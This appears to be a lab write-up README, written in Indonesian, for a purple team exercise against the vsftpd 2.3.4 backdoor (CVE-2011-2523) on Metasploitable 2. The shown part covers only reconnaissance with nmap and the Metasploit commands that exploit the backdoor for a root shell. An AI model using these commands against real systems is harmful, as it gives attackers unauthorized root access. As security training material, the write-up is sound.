# 🛡️ Purple Team Lab: Exploitation & Detection of vsftpd 2.3.4 Backdoor

![Badge Kali](https://img.shields.io/badge/Red%20Team-Kali%20Linux-red) ![Badge Metasploit](https://img.shields.io/badge/Framework-Metasploit-blue) ![Badge Blue Team](https://img.shields.io/badge/Blue%20Team-Incident%20Response-green)

## 📋 Executive Summary
Project ini adalah simulasi laboratorium keamanan siber dengan pendekatan **Purple Team** (gabungan Red Team & Blue Team). Tujuan utamanya adalah mengeksploitasi kerentanan kritis pada layanan FTP legacy dan mempraktikkan langkah-langkah *Incident Response* untuk mendeteksi serta menetralkan serangan tersebut secara *real-time*.

**Objektif:**
1.  **Red Team:** Mendapatkan akses *Root* pada target menggunakan celah keamanan yang diketahui.
2.  **Blue Team:** Mengidentifikasi intrusi jaringan dan melakukan terminasi proses berbahaya.

---

## 🛠️ Lab Environment
Semua aktivitas dilakukan dalam jaringan isolasi virtual (Host-only Network) untuk keamanan.

| Role | OS | IP Address | Tools Used |
| :--- | :--- | :--- | :--- |
| **Attacker** | Kali Linux 2024 | `192.168.56.103` | Nmap, Metasploit Framework |
| **Target** | Metasploitable 2 | `192.168.56.101` | Netstat, System Logs, Bash |

---

## ⚔️ Phase 1: Red Team Operations (Offensive)

### 1. Reconnaissance (Network Scanning)
Langkah awal dilakukan dengan pemindaian port menggunakan **Nmap** untuk mengidentifikasi layanan yang berjalan dan versinya.

<img width="757" height="418" alt="image" src="https://github.com/user-attachments/assets/9076f9ef-8457-4201-8b5e-118bcfda7be2" />


```bash
nmap -sV 192.168.56.101
```

Temuan: Ditemukan Port 21 terbuka menjalankan layanan vsftpd 2.3.4. Berdasarkan database kerentanan umum, versi ini memiliki celah Backdoor Command Execution (CVE-2011-2523).

## ⚔️ 2. Exploitation (Getting Root)
Menggunakan Metasploit Framework, modul exploit exploit/unix/ftp/vsftpd_234_backdoor dimuat untuk memicu backdoor yang tertanam pada layanan tersebut.

```bash
msf6 > use 1
msf6 > set RHOSTS 192.168.56.101
msf6 > exploit
```
Hasil: Serangan berhasil membuka sesi command shell. Verifikasi menggunakan perintah whoami menunjukkan akses sebagai root (Administrator).
<img width="747" height="253" alt="image" src="https://github.com/user-attachments/assets/0fcff6be-86f6-420e-a9c3-7a6d04826055" />
